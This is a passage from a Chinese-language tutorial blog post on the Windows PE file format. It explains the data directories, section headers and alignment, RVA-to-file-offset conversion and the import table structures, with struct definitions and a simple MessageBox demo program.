的子系统，它的取值如下表所示。这个字段决定了系统如何为程序建立初始的界面，链接时的<code>/subsystem:xxx</code>选项指定的就是这个字段的值。如果将子系统指定为Windows CUI，那么系统会自动为程序建立一个控制台窗口，而指定为Windows GUI的话，窗口必须由程序自己建立。</p></li></ul><div class="table-container"><table><thead><tr><th>取值</th><th>Windows.inc中的预定义值</th><th>含义</th></tr></thead><tbody><tr><td>0</td><td>IMAGE_SUBSYSTEM_UNKNOWN</td><td>未知的子系统</td></tr><tr><td>1</td><td>IMAGE_SUBSYSTEM_NATIVE</td><td>不需要子系统（如驱动程序）</td></tr><tr><td>2</td><td>IMAGE_SUBSYSTEM_WINDOWS_GUI</td><td>Windows图形界面</td></tr><tr><td>3</td><td>IMAGE_SUBSYSTEM_WINDOWS_CUI</td><td>Windows控制台界面</td></tr><tr><td>5</td><td>IMAGE_SUBSYSTEM_OS2_CUI</td><td>OS2控制台界面</td></tr><tr><td>7</td><td>IMAGE_SUBSYSTEM_POSIX_CUI</td><td>POSIX控制台界面</td></tr><tr><td>8</td><td>IMAGE_SUBSYSTEM_NATIVE_WINDOWS</td><td>不需要子系统</td></tr><tr><td>9</td><td>IMAGE_SUBSYSTEM_WINDOWS_CE_GUI</td><td>Windows CE图形界面</td></tr></tbody></table></div><ul><li><p>DataDirectory：最重要字段之一，它由16个相同的<code>IMAGE_DATA_DIRECTORY</code>结构组成，虽然PE文件中的数据是按照装入内存后的页属性归类而被放在不同的节中的，但是这些处于各个节中的数据按照用途可以被分为导出表、导入表、资源、重定位表等数据块，这16个<code>IMAGE_DATA_DIRECTORY</code>结构就是用来定义多种不同用途的数据块的。<code>IMAGE_DATA_DIRECTORY</code>结构的定义很简单，它仅仅指出了某种数据块的位置和长度。</p><p><code>DataDirectory</code>是<code>OptionalHeader</code>的最后128个字节，也是<code>IMAGE_NT_HEADERS</code>的最后一部分数据。</p></li></ul><h2 id="3-4-IMAGE-DATA-DIRECTORY"><a href="#3-4-IMAGE-DATA-DIRECTORY" class="headerlink" title="3.4 IMAGE_DATA_DIRECTORY"></a>3.4 IMAGE_DATA_DIRECTORY</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;<span class="comment">//数据块的起始RVA</span></span><br><span class="line">    DWORD   Size;<span class="comment">//数据块的长度</span></span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure><p>16个数据目录的含义：</p><img src="/posts/4dec66bb/IMAGE_DATA_DIRECTORY.jpg" class="" title="16个数据目录的含义"><p>在PE文件中寻找特定的数据时就是从这些<code>IMAGE_DATA_DIRECTORY</code>结构开始的，比如要存取资源，那么必须从第3个<code>IMAGE_DATA_DIRECTORY</code>结构（索引为2）中得到资源数据块的大小和位置；同理，如果要查看PE文件导入了哪些DLL文件的哪些API函数，那就必须首先从第2个<code>IMAGE_DATA_DIRECTORY</code>结构得到导入表的位置和大小。</p><h1 id="4-区块表-节表"><a href="#4-区块表-节表" class="headerlink" title="4. 区块表(节表)"></a>4. 区块表(节表)</h1><h2 id="4-1-PE文件到内存的映射"><a href="#4-1-PE文件到内存的映射" class="headerlink" title="4.1 PE文件到内存的映射"></a>4.1 PE文件到内存的映射</h2><p>在执行一个PE文件的时候，Windows并不在一开始就将整个文件读入内存，而是采用与内存映射文件类似的机制。也就是说，Windows装载器在装载的时候仅仅建立好虚拟地址和PE文件之间的映射关系。当且仅当真正执行到某个内存页中的指令或者访问某一页的数据时，这个页面才会被从磁盘提交到物理内存，这种机制使文件装入的速度和文件大小没有太大关系。</p><p>需要注意的是，系统装载可执行文件的方法又不完全等同于内存映射文件。当使用内存映射文件的时候，数据本身和数据之间的相对位置是完全相同的；而在装载可执行文件的时候，有些数据在装入前会被预处理，如重定位等，正因此，装入以后，数据之间的相对位置可能发生微妙的变化。</p><p>Windows装载器装载DOS头部、PE文件头和区块表部分是不进行任何特殊处理的，而在装载区块的时候则会自动按区块的属性做不同的处理。</p><p>一般情况下，它会处理以下几个方面的内容：</p><ul><li><p>内存页的属性：对于磁盘映射文件来说，所有的页都是按照磁盘映射文件函数指定的属性设置的。但是在装载可执行文件时，与节对应的内存页属性要按照节的属性来设置。所以，在同属于一个模块的内存页中，从不同节映射过来的内存页的属性是不同的。</p></li><li><p>区块的偏移地址：节的起始地址在磁盘文件中是按照<code>IMAGE_OPTIONAL_HEADER32</code>结构的<code>FileAlignment</code>字段的值进行对齐的，而当被加载到内存中时是按照同一结构中的<code>SectionAlignment</code>字段的值对齐的，两者的值可能不同，所以一个节被装入内存后相对于文件头的偏移和在磁盘文件中的偏移可能是不同的。</p><p>注意，节事实上就是相同属性数据的组合。当节被装入到内存中的时候，相同一个节所对应的内存页都将被赋予相同的页属性， 事实上，Windows 系统对内存属性的设置是以页为单位进行的，所以节在内存中的对齐单位必须至少是一个页的大小（对于32位操作系统来说，这个值一般是4KB(1000H)；对于64位操作系统这个值一般是8KB(2000H)）。</p><p>节在磁盘中就没有最小4KB的限制，为了减少磁盘文件的大小，文件对齐的单位一般要小于内存对齐的单位(<code>FileAlignment</code>的值一般为200h)，这样，在磁盘中就不必为每个节对齐4KB的大小了。</p></li><li><p>区块的大小：对节的尺寸的处理主要分为两个方面：</p><p>第一个方面，由于磁盘映像和内存映像中节对齐存储单位的不同而导致了长度扩展不同；</p><p>第二个方面，是对于包含未初始化数据的节的处理问题。既然是未初始化，那么没有必要为其在磁盘中浪费空间资源，但在内存中不同，因为程序一运行，之前未初始化的数据便有可能要被赋值初始化，那么就必须为它们留下空间。</p></li><li><p>不进行映射的区块：有些节并不需要被映射到内存中，例如<code>.reloc</code>节，重定位数据对于文件的执行代码来说是透明的，无作用的，它只是提供Windows装载器使用，执行代码根本不会去访问到它们，所以没有必要将它们映射到物理内存中。</p></li></ul><h2 id="4-2-节表"><a href="#4-2-节表" class="headerlink" title="4.2 节表"></a>4.2 节表</h2><p>PE文件中所有节的属性都被定义在节表中，节表由一系列的<code>IMAGE_SECTION_HEADER</code>结构排列而成，每个结构用来描述一个节，结构的排列顺序和它们描述的节在文件中的排列顺序是一致的。全部有效结构的最后以一个空的<code>IMAGE_SECTION_HEADER</code>结构作为结束，所以节表中<code>IMAGE_SECTION_HEADER</code>结构数量等于节的数量加一。节表总是被存放在紧接在PE文件头的地方。</p><p>另外，节表中<code>IMAGE_SECTION_HEADER</code>结构的总数总是由PE文件头 <code>IMAGE_NT_HEADERS</code>结构中的<code>FileHeader.NumberOfSections</code>字段来指定的。</p><h2 id="4-3-IMAGE-SECTION-HEADER"><a href="#4-3-IMAGE-SECTION-HEADER" class="headerlink" title="4.3 IMAGE_SECTION_HEADER"></a>4.3 IMAGE_SECTION_HEADER</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">    BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; <span class="comment">//节表名称，如.text</span></span><br><span class="line">    <span class="comment">//IMAGE_SIZEOF_SHORT_NAME=8</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        DWORD PhysicalAddress;<span class="comment">//物理地址</span></span><br><span class="line">        DWORD VirtualSize;<span class="comment">//区块尺寸</span></span><br><span class="line">        <span class="comment">//这两个值是一个联合结构，可以使用其中的任何一个，一般取后者</span></span><br><span class="line">    &#125;Misc;                     </span><br><span class="line">    DWORD VirtualAddress;<span class="comment">//区块的RVA地址</span></span><br><span class="line">    DWORD SizeOfRawData;<span class="comment">//在文件中对齐后的尺寸</span></span><br><span class="line">    DWORD PointerToRawData;<span class="comment">//在文件中偏移</span></span><br><span class="line">    DWORD PointerToRelocations;<span class="comment">//在OBJ文件中使用，重定位的偏移</span></span><br><span class="line">    DWORD PointerToLinenumbers;<span class="comment">//行号表的偏移（供调试使用）</span></span><br><span class="line">    WORD NumberOfRelocations;<span class="comment">//在OBJ文件中使用，重定位项数目</span></span><br><span class="line">    WORD NumberOfLinenumbers;<span class="comment">//行号表中行号的数目</span></span><br><span class="line">    DWORD Characteristics;<span class="comment">//区块属性如可读，可写，可执行等</span></span><br><span class="line">&#125;IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><p>重要字段说明如下：</p><ul><li><p>Name：区块名。这是一个由8位的ASCII码名，用来定义区块的名称。多数区块名都习惯性以一个“.”作为开头（例如：<code>.text</code>），但这个“.” 实际上不是必须的。值得注意的是，如果区块名超过8个字节，则没有最后的终止标志“NULL”字节。并且前边带有一个“$”的区块名字会从链接器那里得到特殊的待遇，前边带有“$”的相同名字的区块在载入时候将会被合并，在合并之后的区块中，它们是按照“$”后边的字符的字母顺序进行合并的。</p><p>每个区块的名称都是唯一的，不能有同名的两个区块。但事实上节的名称不代表任何含义，它的存在仅仅是为了正规统一编程的时候方便程序员查看方便而设置的一个标记而已。所以将包含代码的区块命名为“.Data”或者将包含数据的区块命名为“.Code”都是合法的。</p><p>当我们要从PE文件中读取需要的区块的时候，不能以区块的名称作为定位的标准和依据，正确的方法是按照<code>IMAGE_OPTIONAL_HEADER32</code>结构中的数据目录字段结合进行定位。</p></li><li><p>VirtualSize：区块的大小，这是区块的数据在没有进行对齐处理前的实际大小。</p></li><li><p>VirtualAddress：该区块装载到内存中的RVA 地址。这个地址是按照内存页来对齐的，因此它的数值总是<code>SectionAlignment</code>的值的整数倍。</p></li><li><p>SizeOfRawData：该区块在磁盘中所占的大小，这个数值等于<code>VirtualSize</code>字段的值按照<code>FileAlignment</code>的值对齐以后的大小。</p></li><li><p>PointerToRawData：该区块在磁盘文件中所处的位置。这个数值是从文件头开始算起的偏移量。</p></li></ul><p>依靠上面4个字段的值，装载器就可以从PE文件中找出某个节(从<code>PointerToRawData</code>偏移开始的<code>SizeOfRawData</code>字节)的数据，并将它映射到内存中去(映射到从模块基地址偏移<code>VirtualAddress</code>的地方，并占用以<code>VirtualSize</code>的值按照页的尺寸对齐后的空间大小)。</p><ul><li>Characteristics：该区块的属性。该字段是按位来指出区块的属性（如代码/数据/可读/可写等）的标志。可通过链接器的<code>/SECTION</code>选项设置， 下面是比较重要的标志：</li></ul><div class="table-container"><table><thead><tr><th>字段值</th><th>用途</th></tr></thead><tbody><tr><td>IMAGE_SCN_CNT_CODE<br />0x00000020</td><td>包含代码，常与0x10000000一起设置</td></tr><tr><td>IMAGE_SCN_CNT_INITIALIZED_DATA<br />0x00000040</td><td>该块包含已初始化的数据</td></tr><tr><td>IMAGE_SCN_CNT_UNINITIALIZED_DATA<br /> 0x00000080</td><td>该块包含未初始化的数据</td></tr><tr><td>IMAGE_SCN_MEM_DISCARDABLE<br />0x02000000</td><td>该块可被丢弃，一旦加载可被丢弃的块.reloc(重定位块)</td></tr><tr><td>IMAGE_SCN_MEM_SHARED<br />0x10000000</td><td>共享块</td></tr><tr><td>IMAGE_SCN_MEM_EXECUTE<br />0x20000000</td><td>该块可执行，通常与0x00000020标志一起被设置</td></tr><tr><td>IMAGE_SCN_MEM_READ<br />0x40000000</td><td>该块可读</td></tr><tr><td>IMAGE_SCN_MEM_WRITE<br />0x80000000</td><td>该块可写</td></tr></tbody></table></div><h1 id="5-区块-节"><a href="#5-区块-节" class="headerlink" title="5. 区块(节)"></a>5. 区块(节)</h1><p>通常，区块中的数据在逻辑上是关联的。PE 文件一般至少都会有两个区块：一个是代码块，另一个是数据块。每一个区块都需要有一个截然不同的名字，这个名字主要是用来表达区块的用途。例如有一个区块叫<code>.rdata</code>，表明它是一个只读区块。注意：区块在映像中是按起始地址（RVA）来排列的，而不是按字母表顺序。另外，使用区块名字只是人们为了认识和编程的方便，而对操作系统来说这些是无关紧要的。微软给这些区块取了个有特色的名字，但这不是必须的。当编程从PE 文件中读取需要的内容时，如输入表、输出表，不能以区块名字作为参考，正确的方法是按照数据目录表中的字段来进行定位。</p><p>区块名称以及意义： </p><div class="table-container"><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>.text</td><td>默认的区块代码，它的内容全是指令代码</td></tr><tr><td>.data</td><td>默认的读/写数据区块，全局变量、静态变量一般放这</td></tr><tr><td>.rdata</td><td>默认的只读数据区块</td></tr><tr><td>.idata</td><td>包含其他外来DLL的函数及数据信息，即输入表</td></tr><tr><td>.edata</td><td>输出表</td></tr><tr><td>.rsrc</td><td>资源，包含模块的全部资源，如图标、菜单、位图等</td></tr><tr><td>.bss</td><td>未初始化数据</td></tr><tr><td>.tls</td><td>线程局部存储器，包含数据的初始化值，运行时所需要的额外变量</td></tr><tr><td>.reloc</td><td>可执行文件的基址重定位，基址重定位一般仅是DLL文件才需要</td></tr><tr><td>.sdata</td><td>通过全局指针相对寻址的“短”可读/写数据</td></tr><tr><td>.srdata</td><td>通过全局指针相对寻址的“短”只读数据</td></tr><tr><td>.pdata</td><td>异常表</td></tr><tr><td>.debug$S</td><td>OBJ文件中Codeview格式的符号，是一个可变长的Codeview格式符号记录流</td></tr><tr><td>.debug$T</td><td>OBJ文件中Codeview格式的类型记录，是一个可变长的Codeview格式类型记录流</td></tr><tr><td>.debug$P</td><td>使用预编译头时会出现在OBJ文件中</td></tr><tr><td>.drectve</td><td>只用于OBJ文件，包含一些链接器指令</td></tr><tr><td>.didat</td><td>延迟加载的导入数据</td></tr></tbody></table></div><p>在Visual C++中也可以自定义区块名字，用<code>#pragma</code>来声明，告诉编译器插入数据到这个区块内：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;MY_DATA&quot;</span>) </span></span><br></pre></td></tr></table></figure><p>以上语句告诉编译器将数据都放进一个叫“MY_DATA”的区块内，而不是默认的<code>.data</code>区块。区块一般是从OBJ文件开始，被编译器放置的。链接器的工作就是合并左右OBJ和库中需要的块，使其成为一个最终合适的区块。链接器会遵循一套相当完整的规则，它会判断哪些区块被合并以及如何被合并。</p><p>链接器的一个有趣特征就是能够合并区块。如果两个区块有相似、一致的属性(读、写、执行)，那么它们在链接的时候能被合并成一个单一的区块。这取决于是否开启编译器的<code>/merge</code>开关。事实上合并区块有一个好处就是可以节省磁盘的内存空间。</p><p>下面的链接器选项将<code>.rdata</code>与<code>.text</code>区块合并为一个<code>.text</code>区块：<code>/MERGE : .rdata = .text</code></p><p>注意：合并区块时并没有什么硬性规定。例如，把<code>.rdata</code>合并到<code>.text</code>里不会有什么问题，但是不应该将<code>.rsrc</code>、<code>.reloc</code>、<code>.pdata</code>合并到其它的区块里。</p><h2 id="5-1-区块的对齐"><a href="#5-1-区块的对齐" class="headerlink" title="5.1 区块的对齐"></a>5.1 区块的对齐</h2><p>区块大小是要对齐的，有两种对齐值，一种用于磁盘文件内，另一种用于内存中。PE文件头指出了这两个值，它们可以不同。</p><p>PE 文件头里边的<code>FileAligment</code> 定义了磁盘区块的对齐值。每一个区块从对齐值的倍数的偏移位置开始存放。而区块的实际代码或数据的大小不一定刚好是这么多，所以在多余的地方一般以00h来填充，这就是区块间的间隙。例如，在PE文件中，一个典型的对齐值是200h，这样，每个区块都将从200h的倍数的文件偏移位置开始，假设第一个区块在400h处，长度为90h，那么从文件400h到490h为这一区块的内容，而由于文件的对齐值是200h，所以为了使这一区块的长度为<code>FileAlignment</code>的整数倍，491h 到 600h 这一个区间都会被00h 填充，这段空间称为区块间隙，下一个区块的开始地址为600h 。</p><p>PE 文件头里边的<code>SectionAligment</code>定义了内存中区块的对齐值。PE 文件被映射到内存中时，区块总是至少从一个页边界开始。一般在x86 系列的CPU 中，页是按4KB（1000h）来排列的；在IA-64上，是按8KB（2000h）来排列的。所以在x86 系统中，PE文件区块的内存对齐值一般等于1000h，每个区块按1000h的倍数在内存中存放。</p><h2 id="※5-2-RVA到FOA的转换"><a href="#※5-2-RVA到FOA的转换" class="headerlink" title="※5.2 RVA到FOA的转换"></a>※5.2 RVA到FOA的转换</h2><p>RVA是当PE文件被装载到内存中后，某个数据位置相对于文件头的偏移量。如果Windows装载器将一个PE文件装入到00400000h处的内存中，而某个区块中的某个数据被装入0040xxxxh处，那么这个数据的RVA就是(0040xxxxh-00400000h=)xxxxh。反过来说，将RVA的值加上文件被装载的基地址，就可以找到数据在内存中的实际地址。</p><p>RVA使文件装入内存后的数据定位变得方便，然后却给我们要定位位于磁盘上的静态PE文件带来了麻烦。</p><p>当处理PE文件的时候，任何的RVA必须经过到FOA的换算，才能用来定位并访问文件中的数据，但换算却无法用一个简单的公式来完成。事实上，唯一可用的方法就是穷举，步骤如下：</p><ol><li>在内存中得到一个地址VA。</li><li>计算相对地址RVA = VA - <code>ImageBase</code>。</li><li>判断RVA是否在<code>SizeOfHeaders</code>中(DOS部首+PE文件头+块表)。是则FOA==RVA；否则在块中，需进一步分析。</li><li>判断RVA在哪个区块中。循环扫描区块表得出每个区块在内存中的起始地址(<code>IMAGE_SECTION_HEADER</code>的<code>VirtualAddress</code>字段)，并根据区块大小(<code>IMAGE_SECTION_HEADER</code>的<code>VirtualSize</code>字段)算出区块的结束地址(两者相加即可)，最后判断RVA是否落在该区块内。</li><li>已知RVA在哪个区块后，用RVA减去该区块的起始地址，这样就能得到RVA相对于该区块起始地址的偏移量RVA2。</li><li>在区块表中获取该区块在文件中所处的偏移地址(根据<code>IMAGE_SECTION_HEADER</code>中的<code>PointerToRawData</code>字段)，将这个偏移值加上RVA2得到真正的文件偏移地址(FOA)。</li></ol><img src="/posts/4dec66bb/RVA%E4%B8%8EFOA.jpg" class="" title="RVA到FOA的转换"><p>举个例子，求目标RVA为0x198000的文件偏移地址。</p><img src="/posts/4dec66bb/5.2.1.png" class="" title="RVA到FOA的转换例子"><p><code>.text</code>结束RVA = 0x1000 + 0x176ade = 0x177ade &lt; 0x198000</p><p><code>.rdata</code>结束RVA = 0x178000 + 0x4d896 = 0x1c5896 &gt; 0x198000</p><p>所以目标RVA在<code>.rdata</code>段。</p><p>目标RVA相对于<code>.rdata</code>起始RVA的偏移 = 0x198000 - 0x178000 = 0x20000</p><p><code>.rdata</code>段在磁盘文件中的偏移地址 = 0x177000</p><p>所以目标RVA在磁盘文件的偏移地址 = 0x177000 + 0x20000 = 0x197000</p><p><strong>FOA到RVA的转换：</strong></p><ol><li>在PE文件中得到一个地址FOA。</li><li>判断FOA是否在<code>SizeOfHeaders</code>中。是则FOA==RVA；否则在区块中需进一步分析。(或在不映射的区间中，此时无RVA)</li><li>判断FOA在哪个区块。</li></ol><script type="math/tex; mode=display">PointerOfRawData \le FOA\le PointerOfRawData + VirtualSize</script><ol><li>FOA在该区块的偏移为RVA2 = FOA - <code>PointerOfRawData</code>。</li><li>FOA在内存中的偏移为RVA = <code>VirtualAddress</code> + RVA2。</li></ol><h2 id="5-3-输入表"><a href="#5-3-输入表" class="headerlink" title="5.3 输入表"></a>5.3 输入表</h2><h3 id="5-3-1-输入函数"><a href="#5-3-1-输入函数" class="headerlink" title="5.3.1 输入函数"></a>5.3.1 输入函数</h3><p>在代码分析或编程中经常遇到“输入函数”的概念，输入函数就是被程序调用但其执行代码又不在程序中的函数，这些函数的代码位于相关的DLL文件中，在调用者程序中只保留相关的函数信息(如函数名、DLL文件名等)即可。对于磁盘上的PE文件来说，它无法得知这些输入函数在内存中的地址，只有当PE文件被装入内存后，Windows加载器才将相关DLL装入，并将调用输入函数的指令和函数实际所处的地址联系起来，这就是“动态链接”的概念。动态链接是通过PE文件中定义的“输入表”来完成的，输入表中保存的正是函数名和其驻留的DLL名等。</p><h3 id="5-3-2-IMAGE-IMPORT-DESCRIPTOR"><a href="#5-3-2-IMAGE-IMPORT-DESCRIPTOR" class="headerlink" title="5.3.2 IMAGE_IMPORT_DESCRIPTOR"></a>5.3.2 IMAGE_IMPORT_DESCRIPTOR</h3><p>PE文件头的<code>IAMGE_OPTIONAL_HEADER</code>结构中的<code>DataDirectory</code>数组的第二个元素就是指向输入表。而输入表是一个<code>IMAGE_IMPORT_DESCRIPTOR</code>(简称IID)数组。每个被PE文件链接进来的DLL文件都分别对应一个IID数组结构。在这个IID数组中，并没有指出有多少个链接文件，但它<strong>最后是以一个全为0(NULL)的IID作为结束的标志</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span>&#123;</span><span class="comment">//共用体类型，共占同一个地址，分时用</span></span><br><span class="line">        DWORD Characteristics;</span><br><span class="line">        DWORD    OriginalFirstThunk;<span class="comment">//指向输入名称表(INT)RVA的结构数组</span></span><br><span class="line">    &#125;;</span><br><span class="line">DWORD     TimeDateStamp;</span><br><span class="line">DWORD     ForwarderChain;</span><br><span class="line">DWORD     Name;<span class="comment">//指向被输入的DLL名称</span></span><br><span class="line">DWORD     FirstThunk;<span class="comment">//指向输入地址表(IAT)RVA，IAT是一个IMAGE_THUNK_DATA结构的数组</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR, *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p>重要字段如下：</p><ul><li>OriginalFirstThunk：指向输入名称表(INT)RVA的结构数组，数组类型为<code>IMAGE_THUNK_DATA</code>。</li><li>Name：指向存有DLL名称的相对虚拟地址。</li><li>FirstThunk：指向输入地址表(IAT)RVA的结构数组，数组类型为<code>IMAGE_THUNK_DATA</code>。</li></ul><h3 id="5-3-3-IMAGE-THUNK-DATA32"><a href="#5-3-3-IMAGE-THUNK-DATA32" class="headerlink" title="5.3.3 IMAGE_THUNK_DATA32"></a>5.3.3 IMAGE_THUNK_DATA32</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA32</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">       DWORD ForwarderString;<span class="comment">//指向一个转向字符串的RVA</span></span><br><span class="line">       DWORD Function; <span class="comment">//被输入的函数的内存地址</span></span><br><span class="line">       DWORD Ordinal; <span class="comment">//被输入的API的序数值</span></span><br><span class="line">       DWORD AddressOfData;<span class="comment">//指向IMAGE_IMPORT_BY_NAME结构</span></span><br><span class="line">    &#125;u1;</span><br><span class="line">&#125;IMAGE_THUNK_DATA32;</span><br><span class="line"><span class="comment">//IMAGE_THUNK_DATA64与IMAGE_THUNK_DATA32的区别，仅仅是把DWORD换成了64位整数。</span></span><br></pre></td></tr></table></figure><p><code>IMAGE_THUNK_DATA</code>只占一个双字字节，当双字字节的最高位为1时，表示函数以序号方式输入，这时候低31位被看作一个函数序号。当双字字节的最高位为0时，表示函数以字符串类型的函数名方式输入，这时双字的值是一个RVA，指向一个<code>IMAGE_IMPORT_BY_NAME</code>结构。</p><h3 id="5-3-4-IMAGE-IMPORT-BY-NAME"><a href="#5-3-4-IMAGE-IMPORT-BY-NAME" class="headerlink" title="5.3.4 IMAGE_IMPORT_BY_NAME"></a>5.3.4 IMAGE_IMPORT_BY_NAME</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">    WORD    Hint;<span class="comment">//指出函数在所在的dll的输出表中的序号</span></span><br><span class="line">    BYTE    Name[<span class="number">1</span>];<span class="comment">//指出要输入的函数的函数名</span></span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure><p>结构中的<code>Hint</code>字段是可选的，有些编译器总是将它设置为 0，如果它不是0，则它表示函数的序号。<code>Name</code>数组只包含一个元素，但其实它是一个变长数组，保存的是一个以0结尾的字符串，也就是函数名。</p><h3 id="※5-3-5-输入地址表-IAT"><a href="#※5-3-5-输入地址表-IAT" class="headerlink" title="※5.3.5 输入地址表(IAT)"></a>※5.3.5 输入地址表(IAT)</h3><p>在文件中时，<code>OriginalFirstThunk</code>和<code>FirstThunk</code>分别指向一个RVA地址。这个地址转换到文件中，分别对应两个以<code>IMAGE_THUNK_DATA</code>为元素的数组，这两个数组是<strong>以一个填充为 0 的<code>IMAGE_THUNK_DATA</code>作为结束标识符</strong>。虽然它们这两个表位置不同，但实际内容是一模一样的。此时，每个 <code>IMAGE_THUNK_DATA</code>元素指向的是一个记录了函数名和相对应的DLL文件名的<code>IMAGE_IMPORT_BY_NAME</code>结构体。</p><img src="/posts/4dec66bb/5.3.4.png" class="" title="导入表相互关系"><p>为什么会有两个一模一样的数组呢？<code>OriginalFirstThunk</code>指向的数组通常叫做hint-name table，即HNT ，它在 PE 加载到内存中时被保留了下来且永远不会被修改。但是在 Windows 加载过 PE 到内存之后，Windows 会重写<code>FirstThunk</code>所指向的数组元素中的内容，使得数组中每个<code>IMAGE_THUNK_DATA</code>元素不再表示指向带有函数描述的 <code>IMAGE_IMPORT_BY_NAME</code>数组元素，而是直接指向了函数地址。此时，<code>FirstThunk</code>所指向的数组就称之为输入地址表（Import Address Table ，即经常说的 IAT）。</p><img src="/posts/4dec66bb/5.3.5.png" class="" title="输入地址表"><h3 id="5-3-6-查找导入表地址"><a href="#5-3-6-查找导入表地址" class="headerlink" title="5.3.6 查找导入表地址"></a>5.3.6 查找导入表地址</h3><p>让我们从头开始。编写一个EXE程序，里面只有两个API函数：<code>MessageBox()</code>和<code>SetWindowTextA()</code>。目的是找到导入表并且找到<code>MessageBox()</code>在PE文件中的地址和被加载进内存的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> WINAPI <span class="title function_">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, <span class="type">int</span> iCmdShow)</span></span><br><span class="line">&#123;</span><br><span class="line">MessageBox(<span class="literal">NULL</span>, TEXT(<span class="string">&quot;这是我写的第一个程序&quot;</span>), TEXT(<span class="string">&quot;v5le0n9&quot;</span>), MB_OK);</span><br><span class="line">SetWindowTextA(<span class="number">0</span>, <span class="string">&quot;hello&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>编译如果出现如下问题：</p><p>MSVCRTD.lib(exe_main.obj) : error LNK2019: 无法解析的外部符号 _main，该符号在函数 “int __cdecl invoke_main(void)” (?invoke_main@@YAHXZ) 中被引用</p><p>请看：<a href="https://www.tianqiweiqi.com/msvcrtd-lib-error-lnk2019.html">https://www.tianqiweiqi.com/msvcrtd-lib-error-lnk2019.html</a></p><img src="/posts/4dec66bb/5.3.6.png" class="" title="VS2019设置属性"><img src="/posts/4dec66bb/5.3.7.png" class="" title="VS2019设置属性"></blockquote><p>使用PEview查看PE文件结构。</p><img src="/posts/4dec66bb/5.3.8.png" class="" title="PEview查看PE"><p>已知PE文件头的<code>IAMGE_OPTIONAL_HEADER</code>结构中的<code>DataDirectory</code>数组的第二个元素就是指向导入表。<code>IMAGE_DATA_DIRECTORY</code>数据类型中有两个成员，一个是数据块在内存中的偏移地址，另一个是数据块的大小。</p><img src="/posts/4dec66bb/5.3.9.png" class="" title="PEview查看PE"><p>知道了导入表的RVA为0x1B1E4后，遍历<code>IMAGE_SECTION_HEADER</code>数组，最终找到导入表在idata这个区块中（0x1B000 &lt;= 0X1B1E4 &lt;= 0x1BB15）。所以RVA2=0x1E4。</p><img src="/posts/4dec66bb/5.3.10.png" class="" title="PEview查看PE"><p>在PE文件中的偏移为0x8000，大小为0xC00。所以导入表在PE文件中的偏移为0x81E4。</p><img src="/posts/4dec66bb/5.3.11.png" class="" 